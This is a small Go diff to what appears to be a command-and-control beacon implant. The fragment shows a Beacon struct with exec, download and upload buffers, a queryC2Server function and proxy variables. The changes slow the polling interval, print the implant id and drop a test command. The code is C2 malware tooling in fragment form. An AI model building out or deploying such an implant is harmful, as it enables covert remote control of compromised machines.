@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"time"
 	"net/http"
 	"encoding/json"
@@ -13,10 +14,10 @@ type Beacon struct {
 	ExecBuffer []string
 	DownloadBuffer []string
 	UploadBuffer []string
-	LastSeen time.Time
+	LastSeen time.Time 	
 }
 
-var msPerUpdate int = 500
+var msPerUpdate int = 3000
 var cmdProxyIp string
 var cmdProxyId string
 var cmdAddress string
@@ -35,6 +36,7 @@ func queryC2Server(handler Request) {
 }
 
 func main() {
+	fmt.Println("Id: " + id)
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
@@ -44,9 +46,6 @@ func main() {
 	var encoder = Base64Encoder {
 		data: jsonData,
 	}
-
-	jsonData, err = json.Marshal(CommandUpdate{ip,id,"cooltest123 asd asd",nil})
-	debugFatal(err)
 
 	/*var ipidEncoder = IPIDEncoder {
 		data: jsonData,
